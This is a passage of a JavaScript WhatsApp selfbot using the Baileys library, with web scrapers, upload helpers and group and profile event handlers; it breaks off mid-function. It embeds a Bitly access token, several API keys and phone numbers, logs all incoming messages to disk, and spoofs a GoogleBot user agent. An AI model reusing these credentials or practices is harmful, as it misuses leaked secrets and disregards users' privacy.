const { WAConnection, MessageType, Presence, MessageOptions, Mimetype, Browsers, WALocationMessage, WA_MESSAGE_STUB_TYPES, ReconnectMode, ProxyAgent, GroupSettingChange, waChatKey, mentionedJid, processTime } = require("@adiwajshing/baileys")
const benny = new WAConnection()
benny.logger.level = 'warn'
benny.browserDescription = Browsers.ubuntu('Safari')
const qrcode = require("qrcode-terminal")
const qrcodes = require("qrcode")
const moment = require("moment-timezone")
const fs = require("fs")
const { addCommands, checkCommands, deleteCommands } = require('./lib/autoresp')
const { addBadword, checkBadword, deleteBadword } = require('./lib/badword')
const commandsDB = JSON.parse(fs.readFileSync('./src/autoresp.json'))
const badwordDB = JSON.parse(fs.readFileSync('./src/badword.json'))
const ms = require('parse-ms')
const toMs = require('ms')
var util = require('util')
const crypto = require('crypto')
const fetch = require('node-fetch')
const { EmojiAPI } = require("emoji-api");
const emojiss = new EmojiAPI()
const loggc = JSON.parse(fs.readFileSync('./src/loggc.json'))
const { color, bgcolor } = require('./lib/color')
const translate = require('@vitalets/google-translate-api')
const imgtopdf = require("pdfkit")
const { donasi } = require('./lib/donasi')
const { fetchJson, uploadImages } = require('./lib/fetcher')
const { uploadimg } = require('./lib/uploadimage')
const { webp2mp4Url, webp2gifFile, reverseVideoFile, voiceremover } = require('./lib/ezgif')
const { recognize } = require('./lib/ocr')
const os = require('os')
const PasteGG = require('paste.gg')
const BitlyClient = require('bitly').BitlyClient;
const bitly = new BitlyClient('50bcf0925ccd566144dff12dde796ac252034d9d');
const pasteGG = new PasteGG()
const { wait, simih, kepo, generateMessageID, getGroupAdmins, getRandom, banner, custom, halah, hilih, huluh, heleh, holoh, start, info, success, close } = require('./lib/functions')
const igdl = require('instagram-scraping')
const { yta, ytv, buffer2Stream, ytsr, baseURI, stream2Buffer, noop } = require('./lib/ytdl')
const igdls = require('instagram-url-direct')
const cheerio = require('cheerio')
const infotlp = require('no-telp')
const { addbot, addBot } = require('./lib/addbot')
const ytdl = require('ytdownload')
const ytsearch = require('scrape-youtube').default;
const brainly = require('brainly-scraper')
const axios = require("axios")
const request = require('request')
const igstalk = require('instatouch')
const sID = process.env.sID;
const rumus = require('rumus-bdr')
const angkab = require('@develoka/angka-terbilang-js')
const ffmpeg = require('fluent-ffmpeg')
const imageToBase64 = require('image-to-base64');
const base64ToImage = require('base64-to-image');
var base64Img = require('base64-img');
const { removeBackgroundFromImageFile, RemoveBgResult, RemoveBgError, removeBackgroundFromImageUrl } = require('remove.bg')
const kasar = JSON.parse(fs.readFileSync('./src/antibadword.json'))
const ls = fs.readdirSync('./')
const virus = JSON.parse(fs.readFileSync('./src/antivirus.json'))
const autostick = JSON.parse(fs.readFileSync('./src/autosticker.json'))
const _autostick = JSON.parse(fs.readFileSync('./src/autostickpc.json'))
const kotor = JSON.parse(fs.readFileSync('./src/kasar.json'))
const _registered = JSON.parse(fs.readFileSync('./src/registered.json'))
const register = require('./functions/register')
const reminder = require('./functions/reminder')
const _reminder = JSON.parse(fs.readFileSync('./src/reminder.json'))
const _level = JSON.parse(fs.readFileSync('./src/level.json'))
const anlink = JSON.parse(fs.readFileSync('./src/antilink.json'))
let ownerNumber = JSON.parse(fs.readFileSync('./setting.json'))
const _premium = JSON.parse(fs.readFileSync('./src/premium.json'))
const _sewa = JSON.parse(fs.readFileSync('./src/sewa.json'))
const kickarea = JSON.parse(fs.readFileSync('./src/kickarea.json'))
const _ban = JSON.parse(fs.readFileSync('./src/banned.json'))
const _bot = JSON.parse(fs.readFileSync('./src/bot.json'))
const _afk = JSON.parse(fs.readFileSync('./src/afk.json'))
const limit = require('./functions/limit')
let _limit = JSON.parse(fs.readFileSync('./src/limit.json'))
const botHit = JSON.parse(fs.readFileSync('./src/botHit.json'))
const _porn = JSON.parse(fs.readFileSync('./src/aporn.json'))
const jadwas = require('./lib/jadwalsholat')
const hit = require('./functions/hit')
const _hit = JSON.parse(fs.readFileSync('./src/userhit.json'))
const premium = require('./functions/premium')
const sewa = require('./functions/sewa')
const afk = require('./functions/afk')
const welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
const nsfw = JSON.parse(fs.readFileSync('./src/nsfw.json'))
const samih = JSON.parse(fs.readFileSync('./src/simi.json'))
const setiker = JSON.parse(fs.readFileSync('./src/stik.json'))
const videonye = JSON.parse(fs.readFileSync('./src/video.json'))
const audionye = JSON.parse(fs.readFileSync('./src/audio.json'))
const imagenye = JSON.parse(fs.readFileSync('./src/image.json'))
const Math_js = require('mathjs')
const speed = require('performance-now')
const speedTest = require('@lh2020/speedtest-net');
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss DD:MM:YYYY")
const cron = require('node-cron')
const { exec, spawn } = require("child_process")

const mediafireDl = async (url) => {
const res = await axios.get(url) 
const $ = cheerio.load(res.data)
const link = $('a#downloadButton').attr('href')
const size = $('a#downloadButton').text().replace('Download', '').replace('(', '').replace(')', '').replace('\n', '').replace('\n', '').replace('                         ', '')
const seplit = link.split('/')
const nama = seplit[5]
mime = nama.split('.')
mime = mime[1]
return { nama, mime, size, link }
}

const getBuffer = async (url, options) => {
	try {
		options ? options : {}
		const res = await axios({
			method: "get",
			url,
			headers: {
				'DNT': 1,
				'Upgrade-Insecure-Request': 1
			},
			...options,
			responseType: 'arraybuffer'
		})
		return res.data
	} catch (e) {
		console.log(`Error : ${e}`)
	}
}

const getBaper = async (url, options) => {
	try {
		options ? options : {}
		const res = await axios({
			method: "get",
			url,
			headers: {
				'DNT': 1,
				'Upgrade-Insecure-Request': 1
			},
			...options,
			responseType: 'arraybuffer'
		})
		return res.data
	} catch (e) {
		console.log(`Error : ${e}`)
	}
}

const getName = (jid) => {
	if (jid == benny.user.jid) return benny.user.name
	const nama = benny.contacts[jid]
	console.log(nama)
	name = nama.notify || nama.vname || nama.name || 'Tidak Terbaca'
	return name
}

// Message filter
const usedCommandRecently = new Set()

const isFiltered = (from) => {
    return !!usedCommandRecently.has(from)
}

const addFilter = (from) => {
    usedCommandRecently.add(from)
    setTimeout(() => {
        return usedCommandRecently.delete(from)
    }, 5000) // 5 seconds delay, I don't recommend below that.
}

const jadwalSolat = async(tempat) => {
const url = `https://m.dream.co.id/jadwal-salat/${tempat}`
const res = await axios.get(url)
const $ = cheerio.load(res.data)
const a = $('table').find('tbody > tr > td')
const emror = "_[ ! ] Error Daerah Tidak DiTemukan_"
const daerah = url.split('/')[4]
const tanggal = $(a).eq(0).text()
const shubuh = $(a).eq(1).text()
const dzuhur = $(a).eq(2).text()
const ashar = $(a).eq(3).text()
const maghrib = $(a).eq(4).text()
const isya = $(a).eq(5).text()
return { daerah, tanggal, shubuh, dzuhur, ashar, maghrib, isya}
}

const uploadBerkas = (path) => new Promise((resolve, reject) => {
     const {default: Axios} = require('axios')
     const FormData = require('form-data')
     const fd = new FormData()
     fd.append('sampleFile', fs.createReadStream(path))
     Axios({
          method: 'POST',
          url: 'https://top4top.io/index.php',
          data: fd,
          headers: {
               'user-agent': 'MRHRTZ-ZONE :D',
               'content-type': `multipart/form-data; boundary=${fd._boundary}`
          }
     }).then(({ data }) => resolve(data)).catch(reject)
})

async function uploadMedia(path) {
	return new Promise((resolve, reject) => {
	Form = require('form-data'),
	form = new Form(),
	form.append('file', fs.createReadStream(path))
	fetch('https://storage.restfulapi.my.id/upload', {
		method: 'post',
		body: form
	})
	.then(res => res.json())
	.then(resolve)
	.catch(reject)
	})
}

const wikiSearch = async (query) => {
const res = await axios.get(`https://id.m.wikipedia.org/wiki/${query}`)
const $ = cheerio.load(res.data)
let wiki = $('#mf-section-0').find('p').text()
let thumb = 'https:' + $('#mf-section-0').find('div > div > a > img').attr('src')
let judul = $('h1#section_0').text()
return { wiki, thumb, judul }
}

const kusonime = async(query) => {
	const ling = await axios.get(`https://kusonime.com/?s=${query}&post_type=post`)
const $ = cheerio.load(ling.data)
const hasil = []
 
const link = $('div.venz > ul > div.kover > div.detpost > div.content > h2.episodeye > a').attr('href')
const judul = $('div.venz > ul > div.kover > div.detpost > div.content > h2.episodeye > a').attr('title')
 
 
const lling = await axios.get(`${link}`) 
const $$ = cheerio.load(lling.data)
const img = $$('div.venser > div.post-thumb > img').attr('src')
const title_japanese = $$('div.venser > div.venutama > div.lexot > div.info > p').eq(0).text().replace('Japanese: ','')
const genre = $$('div.venser > div.venutama > div.lexot > div.info > p').eq(1).text().replace('Genre : ','')
const season =  $$('div.venser > div.venutama > div.lexot > div.info > p').eq(2).text().replace('Seasons : ','')
const producer =  $$('div.venser > div.venutama > div.lexot > div.info > p').eq(3).text().replace('Producers: ','')
const tipe =  $$('div.venser > div.venutama > div.lexot > div.info > p').eq(4).text().replace('Type: ','')
const status = $$('div.venser > div.venutama > div.lexot > div.info > p').eq(5).text().replace('Status: ','')
const total_eps =  $$('div.venser > div.venutama > div.lexot > div.info > p').eq(6).text().replace('Total Episode: ','')
const score =  $$('div.venser > div.venutama > div.lexot > div.info > p').eq(7).text().replace('Score: ','')
const duration =  $$('div.venser > div.venutama > div.lexot > div.info > p').eq(8).text().replace('Duration: ','')
const rilis =  $$('div.venser > div.venutama > div.lexot > div.info > p').eq(9).text().replace('Released on: ','')
return { link, judul, img, title_japanese, genre, season, producer, tipe, status, total_eps, score, duration, rilis }
}

async function ArtiNama(nama) {
  return new Promise((resolve, reject) => {
    axios.get(`https://www.primbon.com/arti_nama.php?nama1=${nama}&proses=+Submit%21+`)
      .then(({
        data
      }) => {
        const $ = cheerio.load(data)
        const isi = $('#body').text().split('Nama:')[0].replace(/\n\n\n\n\n\n\n\n\n/gi, '\n').split('ARTI NAMA\n')[1].replace('\n      \n        \n        \n          ', '')
          resolve(isi)
      })
      .catch(reject)
  })
}

async function ArtiMimpi(mimpi) {
  return new Promise((resolve, reject) => {
    axios.get(`https://www.primbon.com/tafsir_mimpi.php?mimpi=${mimpi}&submit=+Submit+`)
      .then(({
        data
      }) => {
        const $ = cheerio.load(data)
        const detect = $('#body > font > i').text()
        const isAva = /Tidak ditemukan/g.test(detect) ? false : true
        if (isAva) {
          const isi = $('#body').text().split(`Hasil pencarian untuk kata kunci: ${mimpi}`)[1].replace(/\n\n\n\n\n\n\n\n\n/gi, '\n')
          resolve(isi)
        } else {
          const res = {
            status: 404,
            result: `Arti Mimpi ${mimpi} Tidak Di Temukan`
          }
          resolve(res)
        }
      })
      .catch(reject)
  })
}

function kbbiSearch(KATA) {
    return new Promise(function (resolve, reject) {                                                                                                                                                               //<https://github.com/ArugaZ/whatsapp-bot>
		axios.get(`https://kbbi.kemdikbud.go.id/entri/${KATA}`)
		.then(req => {
			try {
				const arti = []
				let soup = cheerio.load(req.data)
				soup('ol').each(function(a, b) {
					soup(b).find('li').each(function(c, d) {
						arti.push(soup(d).text())
					})
				})
				soup('ul.adjusted-par').each(function(a, b) {
					soup(b).find('li').each(function(c, d) {
						arti.push(soup(d).text())
					})
				})
				resolve({result: arti})
			} catch (err) {
				reject({
					status: 'error',
					error: err
				})
			}
		})
		.catch((err) => {
			reject({
				status: 'error',
				error: err
			})
		})
	})
}
 
const uploadFile = (path) => new Promise((resolve, reject) => {
	const { default: Axios } = require('axios')
	const FormData = require('form-data')
     const fd = new FormData()
     fd.append('sampleFile', fs.createReadStream(path))
     Axios({
          method: 'POST',
          url: 'https://pecundang.herokuapp.com/upload',
          data: fd,
          headers: {
               'user-agent': 'MRHRTZ-ZONE :D',
               'content-type': `multipart/form-data; boundary=${fd._boundary}`
          }
     }).then(({ data }) => resolve(data)).catch(reject)
})

const uploadimgs = async (filename, name) => {
	const FormData = require('form-data')
    var image = fs.readFileSync(filename)
    var form = new FormData()
	
    form.append('files[]', image, name)
     
    const upload = fetch('https://uguu.se/upload.php', {
        method: 'POST',
        body: form
    }).then((response) => response.json())
        .then((result) => {
			console.log(result)
            return result
        })
        .catch(e => {
            return e
        })
    return upload
}

const resepnya = async (QUERY) => {
	try {
		const resep1 = await axios.get(`https://masak-apa.tomorisakura.vercel.app/api/search/?q=${QUERY}`)
		if (resep1.data.results[0] == '' || resep1.data.results[0] == undefined)
			return {
				"status": 200,
				"error": "Query yang anda cari tidak tersedia!"
			}
		//console.log(resep1)
		const random = Math.floor(Math.random() * resep1.data.results.length);
		const resep2 = await axios.get('https://masak-apa.tomorisakura.vercel.app/api/recipe/' + resep1.data.results[random].key)
		//console.log(resep2)
		const results = resep2.data.results
		return {
			results
		}
	} catch (err) {
		return { err }
	}
}

const jagoKata = async (query) => {
const base = `https://jagokata.com/kata-bijak/kata-${query}.html`
const des = await axios.get(base)
const sup = cheerio.load(des.data)
var page = sup('h4 > strong').eq(2).text() / 10
page = parseInt(page)
const randomPage = Math.floor(Math.random() * page)
const res = await axios.get(`${base}?page=${randomPage}`)
const $ = cheerio.load(res.data)
const hasil = []
const list = $('ul > li')
const random = Math.floor(Math.random() * 10)
const isi = $(list).find('q.fbquote').eq(random).text() 

var by = $(list).find('div > div > a').eq(random).text()
by = by ? by : "Kang Galon"
return { isi,  by }
}

const alay = (text) => {
     const K = new RegExp("[AaOoIiSs]", "g")
    text = text.replace(K, "4", "6", "0", "1", "5")
    return text
}

var dates = moment().tz('Asia/Jakarta').format("YYYY-MM-DDTHH:mm:ss");
		var date = new Date(dates);
        var tahun = date.getFullYear();
        var bulan1 = date.getMonth();
        var tanggal = date.getDate();
        var hari = date.getDay();
        var haris = date.getDay();
        var jam = date.getHours();
        var menit = date.getMinutes();
        var detik = date.getSeconds();
        var waktoo = date.getHours();
            switch(hari) {
                case 0: hari = "Minggu"; break;
                case 1: hari = "Senin"; break;
                case 2: hari = "Selasa"; break;
                case 3: hari = "Rabu"; break;
                case 4: hari = "Kamis"; break;
                case 5: hari = "Jum`at"; break;
                case 6: hari = "Sabtu"; break;
            }
            switch(bulan1) {
                case 0: bulan1 = "Januari"; break;
                case 1: bulan1 = "Februari"; break;
                case 2: bulan1 = "Maret"; break;
                case 3: bulan1 = "April"; break;
                case 4: bulan1 = "Mei"; break;
                case 5: bulan1 = "Juni"; break;
                case 6: bulan1 = "Juli"; break;
                case 7: bulan1 = "Agustus"; break;
                case 8: bulan1 = "September"; break;
                case 9: bulan1 = "Oktober"; break;
                case 10: bulan1 = "November"; break;
                case 11: bulan1 = "Desember"; break;
            }
            switch(waktoo){
                case 0: waktoo = "Tengah Malam🌚 - Tidur Kak:)"; break;
                case 1: waktoo = "Tengah Malam🌚 - Tidur Kak:)"; break;
                case 2: waktoo = "Dini Hari🌒 - Tidur Kak:)"; break;
                case 3: waktoo = "Dini Hari🌓 - Tidur Kak:)"; break;
                case 4: waktoo = "Subuh🌔"; break;
                case 5: waktoo = "Subuh🌔"; break;
                case 6: waktoo = "Selamat Pagi🌝"; break;
                case 7: waktoo = "Selamat Pagi🌝"; break;
                case 8: waktoo = "Selamat Pagi🌝"; break;
                case 9: waktoo = "Selamat Pagi"; break;
                case 10: waktoo = "Selamat Pagi🌞"; break;
                case 11: waktoo = "Selamat Siang🌞"; break;
                case 12: waktoo = "Selamat Siang🌞"; break;
                case 13: waktoo = "Selamat Siang🌞"; break;
                case 14: waktoo = "Selamat Siang🌞"; break;
                case 15: waktoo = "Selamat Sore🌝"; break;
                case 16: waktoo = "Selamat Sore🌝"; break;
                case 17: waktoo = "Selamat Sore🌖"; break;
                case 18: waktoo = "Magrib🌘"; break;
                case 19: waktoo = "Magrib🌚"; break;
                case 20: waktoo = "Selamat Malam🌚"; break;
                case 21: waktoo = "Selamat Malam🌚"; break;
                case 22: waktoo = "Selamat Malam🌚"; break;
                case 23: waktoo = "Tengah Malam🌚 - Tidur Kak:)"; break;
            }
            var tampilTanggal = "" + hari + ", " + tanggal + " " + bulan1 + " " + tahun;
            var tampilHari = "" + waktoo;
            var tampilWaktu = moment().tz('Asia/Jakarta').format("HH:mm:ss");
            var tampilWaktus = moment().tz('Asia/Makassar').format("HH:mm:ss");
            var tampilWaktuss = moment().tz('Asia/Jayapura').format("HH:mm:ss");

prefix2 = '#'
baterai = {
	battery: "" || "Tidak terdeteksi",
	isCharge: "" || false
}
numbernye = '0@s.whatsapp.net'
fake = `SELFBOT`
teroli = 99999999999999
namabot = 'MohammadBOT'
namastc = `./src/iri.mp3`
targetprivate = '0'
blocked = []            
banChats = true
autojoin = false
antitag = true
autoblock = false
autodemote = false
autoread = false
autoget = false
banChat = false
tebakgamb = false
setgrup = "6289636006352-1606097314@g.us"
alasanoff = 'Mengtidur'
simple = true
monospace = '```'
logprofile = false
blockcall = false
harganya = '150000000'
totalhit = 0
setthumb = fs.readFileSync('./src/sticker/keseltag.webp')
waktuafk = `${time}`
lbua = 'https://paste.gg/p/bennyhidayat21/44f950b1ca1d4448b8d012afe6a51229'
reason = 'Nothing'
txtwl = ''
adadeh = ''
waktuoff = `${time}`
const limitCount = 25
const hitCount = 0
const arrayBulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']

const bulan = arrayBulan[moment().format('MM') - 1]

function joinGroup(link) {
	benny.query({
json:["action", "invite", `${link.replace('https://chat.whatsapp.com/','')}`]
})
}

async function groupInfo(link) {
	const gcinfo = await benny.query({
json:["query", "invite", link.replace('https://chat.whatsapp.com/','')]
})
console.log(gcinfo)
return gcinfo
}

function revokeLink(jid) {
	benny.query({
json:["action", "inviteReset", jid]
})
}

function getGempa() {
	const {default: Axios} = require('axios')
	const cheerio = require('cheerio')
     return new Promise((resolve, reject) => {
          Axios.get('https://www.bmkg.go.id/')
               .then(({ data }) => {
                    const $ = cheerio.load(data)
                    // console.log(data);
                    resolve({
                         status: true,
                         gambar: $('div.gempabumi-home-bg.margin-top-13 > div > div:nth-child(1) > a').attr('href'),
                         waktu: $('span.waktu').text(),
                         magnitudo: $('div.gempabumi-detail > ul > li:nth-child(2)').text(),
                         kedalaman: $('div.gempabumi-detail > ul > li:nth-child(3)').text(),
                         koordinat: $('div.gempabumi-detail > ul > li:nth-child(4)').text(),
                         lokasi: $('div.gempabumi-detail > ul > li:nth-child(5)').text(),
                         tsunami: $('div.gempabumi-detail > ul > li:nth-child(6)').text()
                    })
               })
               .catch((response) => {
                    reject({ status: false, message: response })
               })
     })
}

function tek(seconds){
  function tok(s){
    return (s < 10 ? '' : '') + s;
  }
  var hours = Math.floor(seconds / (60*60));
  var minutes = Math.floor(seconds % (60*60) / 60);
  var seconds = Math.floor(seconds % 60);

  //return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
  return `${tok(hours)}Jam ${tok(minutes)}Menit ${tok(seconds)}Detik`
}

function speedText(speed) {
    let bits = speed * 8;
    const units = ['', 'K', 'M', 'G', 'T'];
    const places = [0, 1, 2, 3, 3];
    let unit = 0;
    while (bits >= 2000 && unit < 4) {
      unit++;
      bits /= 1000;
    }

    return `${bits.toFixed(places[unit])} ${units[unit]}bps`;
}

benny.on('qr', qr => {
	
   qrcode.generate(qr, { small: true })
    console.log(`[ ${time} ] Sqan Qr nih`)
   console.log(color('B', 'green'), color('e', 'red'), color('n', 'yellow'), color('n', 'purple'), color('y', 'blue'), color('BOT', 'cyan'))
   console.log(color('SUPPORT by https://pecundang.herokuapp.com', 'cyan'))
})

benny.on('credentials-updated', () => {
   const authInfo = benny.base64EncodedAuthInfo()
   console.log(`credentials updated!`)
   
   fs.writeFileSync('./session.json', JSON.stringify(authInfo, null, '\t'))
   benny.logger.info('Welcome Back Owner Have Fun With This Script :)')
})

fs.existsSync('./session.json') && benny.loadAuthInfo('./session.json')

benny.connect();

benny.on('CB:Chat,cmd:action', async (mek) => {
	if (!loggc.includes(mek[1].id)) return
	const groupMetadata = await benny.groupMetadata(mek[1].id)
	const groupMembers = groupMetadata.participants
	const groupAdmins = getGroupAdmins(groupMembers)
	const isBotGroupAdmins = groupAdmins.includes(benny.user.jid)
	console.log(mek[1])
	if (mek[1].data[0] == 'announce') {
	if (mek[1].data[0] == 'announce' && mek[1].data[2] == true && isBotGroupAdmins) return benny.sendMessage(mek[1].id, `*Group telah ditutup oleh admin:* @${mek[1].data[1].split('@')[0]}`, MessageType.text, {contextInfo: {mentionedJid: [mek[1].data[1].replace('c.us', 's.whatsapp.net')]}})
	if (mek[1].data[0] == 'announce' && mek[1].data[2] == false) return benny.sendMessage(mek[1].id, `*Group telah dibuka oleh admin:* @${mek[1].data[1].split('@')[0]}`, MessageType.text, {contextInfo: {mentionedJid: [mek[1].data[1].replace('c.us', 's.whatsapp.net')]}})
	} else if (mek[1].data[0] == 'subject') {
	benny.sendMessage(mek[1].id, `*Nama group telah diubah oleh admin:* @${mek[1].data[1].split('@')[0]} *menjadi:* ${mek[1].data[2].subject}`, MessageType.text, {contextInfo: {mentionedJid: [mek[1].data[1].replace('c.us', 's.whatsapp.net')]}})
	} else if (mek[1].data[0] == 'ephemeral') {
	if (mek[1].data[0] == 'ephemeral' && mek[1].data[2] == 604800 && isBotGroupAdmins) return benny.sendMessage(mek[1].id, `*Admin* @${mek[1].data[1].split('@')[0]} *Telah menyalakan pesan sementara*`, MessageType.text, {contextInfo: {mentionedJid: [mek[1].data[1].replace('c.us', 's.whatsapp.net')]}})
	if (mek[1].data[0] == 'ephemeral' && mek[1].data[2] == 0) return benny.sendMessage(mek[1].id, `*Admin* @${mek[1].data[1].split('@')[0]} *Telah mematikan pesan sementara*`, MessageType.text, {contextInfo: {mentionedJid: [mek[1].data[1].replace('c.us', 's.whatsapp.net')]}})
} else if (mek[1].data[0] == 'desc_add') {
	if (mek[1].data[0] == 'desc_add') return benny.sendMessage(mek[1].id, `*Admin* @${mek[1].data[1].split('@')[0]} *Telah mengubah deskripsi group menjadi:*\n${mek[1].data[2].desc}`, MessageType.text, {contextInfo: {mentionedJid: [mek[1].data[1].replace('c.us', 's.whatsapp.net')]}})
}
})

benny.on('contact-update', async (lan) => {
	console.log(lan)
})

benny.on('CB:action,,user', async (hexa) => {
	console.log(hexa)
})

benny.on('CB:Cmd,type:picture', async (BTS) => {
	benny.setProfilePicture(BTS[1])
	if (!logprofile) return
	console.log(BTS)
	if (BTS[1].jid == '6282299784421@c.us') return
	try {
					ppimg = await benny.getProfilePicture(BTS[1].jid.split('@')[0] + '@s.whatsapp.net')
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
	buffer = await getBaper(ppimg)
	benny.sendMessage(BTS[1].jid.split('@')[0] + '@s.whatsapp.net', buffer, MessageType.image, {caption: '*Anda telah mengubah profile picture*'})
})

benny.on('CB:Status,status', async (lol) => {
	if (!logprofile) return
	console.log(lol)
	benny.sendMessage(lol[1].id.replace('c.us', 's.whatsapp.net'), `*Anda telah mengubah bio menjadi:* ${lol[1].status}`, MessageType.text, {quoted: adadeh})
})

benny.on("CB:action,,battery", json => {
	  const battery = json[2][0][1].value
	  const persenbat = parseInt(battery)
	  baterai.battery = `${persenbat}%`
	  baterai.isCharge = json[2][0][1].live
})

benny.on('CB:pushname', async (bts) => {
	if (!logprofile) return
	console.log(bts)
})

benny.on("CB:Call", json => {
	 if (blockcall === false) return
	  let call;
	  calling = JSON.parse(JSON.stringify(json))
	  call = calling[1].from
		  benny.sendMessage(call, `*Maaf ${benny.user.name} tidak bisa menerima panggilan.*\n*Nelfon = Block!*`, MessageType.text)
		  .then(() => benny.blockUser(call, "add"))

})

benny.on('message-new', async (ben) => {
	try {
		if (!ben.message) return
		ben.message = (Object.keys(ben.message)[0] === 'ephemeralMessage') ? ben.message.ephemeralMessage.message : ben.message
		let infoMSG = JSON.parse(fs.readFileSync('./src/.dat/msg.data.json'))
		infoMSG.push(JSON.parse(JSON.stringify(ben)))
		fs.writeFileSync('./src/.dat/msg.data.json', JSON.stringify(infoMSG, null, 2))
		const urutan_pesan = infoMSG.length
		if (urutan_pesan >= 1000) {
			infoMSG.splice(1, 999)
			fs.writeFileSync('./src/.dat/msg.data.json', JSON.stringify(infoMSG, null, 2))
		}
		global.blocked
		const content = JSON.stringify(ben.message)
		var from = ben.key.remoteJid
		const type = Object.keys(ben.message)[0]
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const barbarkey = '--'
		const naufalkey = 'YunitaGanteng'
		const lolkey = 'oniichan'
		const vhtearkey = 'YunitaGanteng'
		const hujankey = 'AdelwinNL'
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('HH:mm:ss DD:MM:YYYY')
		budy = (type === 'conversation') ? ben.message.conversation : (type === 'extendedTextMessage') ? ben.message.extendedTextMessage.text : ''
		prefix = /^[°zZ•π.'":÷×¶∆£¢€¥®™✓=;~ |!+<?#$%^&\/\\©^]/.test(budy) ? budy.match(/^[°zZ•π.'":÷×¶∆£¢€¥®™✓=;~ |!+<?#$%^&\/\\©^]/gi)[0] : '-'
		body = (type === 'conversation' && ben.message.conversation.startsWith(prefix)) ? ben.message.conversation : (type == 'imageMessage') && ben.message.imageMessage.caption.startsWith(prefix) ? ben.message.imageMessage.caption : (type == 'videoMessage') && ben.message.videoMessage.caption.startsWith(prefix) ? ben.message.videoMessage.caption : (type == 'extendedTextMessage') && ben.message.extendedTextMessage.text.startsWith(prefix) ? ben.message.extendedTextMessage.text : ''
		const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
		const commando = body.slice(1)
		var Link = budy = (type === 'conversation') ? ben.message.conversation : (type === 'extendedTextMessage') ? ben.message.extendedTextMessage.text : ''
		const messageLink = Link.slice(0).trim().split(/ +/).shift().toLowerCase()
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
		const arg = budy.slice(command.length + 2, budy.length)
		mess = {
			wait: '[ WAIT ] Sedang di proses ...⏳',
			success: 'Berhasil!',
			error: {
				stick: 'Maaf, terjadi kesalahan saat convert gambar ke sticker',
				Iv: 'Linknya mokad:v',
				api: 'Error'
			},
			only : {
				pc: 'Perintah ini hanya bisa digunakan di private chat saja!',
				Registered: `Kamu belum terdaftar di database!\n\nSilakan register dengan format:\n*${prefix}daftar*\n\nNote:\nHarap save nomor ku agar bisa mendapatkan serial!!`,
				group: 'Grup only bruh...',
				ownerG: 'Owner grup only bruh...',
				ownerB: 'Lu siapa?',
				admin: 'Mimin grup only bruh...',
				premium: `Premium user only bruh...\nMau jadi user premium?\nChat wa.me/6289636006352`,
				Badmin: 'Jadiin gw admin dlu su!'
			}
		}

		const botNumber = benny.user.jid
		const buattag = botNumber.replace('@s.whatsapp.net', '')
		const devNumber = [botNumber] // ganti nomer lu
		const isGroup = from.endsWith('@g.us')
		const isStatus = from.includes('status@broadcast')
		const sender = ben.key.fromMe ? benny.user.jid : isGroup ? ben.participant : ben.key.remoteJid
		const totalchat = await benny.chats.all()
        const nameReq = isGroup ? ben.participant : ben.key.remoteJid
		const pushname = ben.key.fromMe ? benny.user.name : benny.contacts[nameReq].vname || benny.contacts[nameReq].notify || '-'
		const groupMetadata = isGroup ? await benny.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isRegistered = register.checkRegisteredUser(sender, _registered)
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const isAntilink = isGroup ? anlink.includes(from) : false
		const isAntiPorn = isGroup ? _porn.includes(from) : false
		const isWelkom = isGroup ? welkom.includes(from) : false
		const isKasar = isGroup ? kasar.includes(from) : false
		const isBot = isGroup ? _bot.includes(from) : false
		const isVirus = isGroup ? virus.includes(from) : false
		const isAutoSticker = isGroup ? autostick.includes(from) : false
		const isAutoStick = _autostick.includes(sender)
		const isNsfw = isGroup ? nsfw.includes(from) : false
		const isSimi = isGroup ? samih.includes(from) : false
		const isKickArea = isGroup ? kickarea.includes(from) : false
		const isOwner = ownerNumber.includes(sender)
		const isDev = devNumber.includes(sender)
		const isBanned = _ban.includes(sender)
		const isAfk = _afk.includes(sender)
		const isPremium = premium.checkPremiumUser(sender, _premium)
		const isSewa = sewa.checkPremiumUser(from, _sewa)
        const chats = type == 'conversation' || type == 'extendedTextMessage'
		const isUrl = (url) => {
			return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
		}
		
		const fetch = require("node-fetch");
const cheerio = require("cheerio");
const cookie = require("cookie");
const FormData = require("form-data");

async function keeptiktok(url) {
	console.log(color(tampilTanggal, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Scrapping keeptiktok...'))
  const geturl = await fetch("https://keeptiktok.com/?lang=ID", {
    method: "GET",
    headers: {
      "User-Agent": "GoogleBot",
    },
  });
  const caritoken = await geturl.text();
  let hasilcookie = geturl.headers
    .get("set-cookie")
    .split(",")
    .map((v) => cookie.parse(v))
    .reduce((a, c) => {
      return { ...a, ...c };
    }, {});
  hasilcookie = {
    _cfduid: hasilcookie._cfduid,
    PHPSESSID: hasilcookie.PHPSESSID,
  };
  hasilcookie = Object.entries(hasilcookie)
    .map(([name, value]) => cookie.serialize(name, value))
    .join("; ");
  const $ = cheerio.load(caritoken);
  const token = $('input[name="token"]').attr("value");
  const form = new FormData();
  form.append("url", url);
  form.append("token", token);
  const geturl2 = await fetch("https://keeptiktok.com/?lang=ID", {
    method: "POST",
    headers: {
      Accept: "/",
      "Accept-Language": "en-US,en;q=0.9",
      "User-Agent": "GoogleBot",
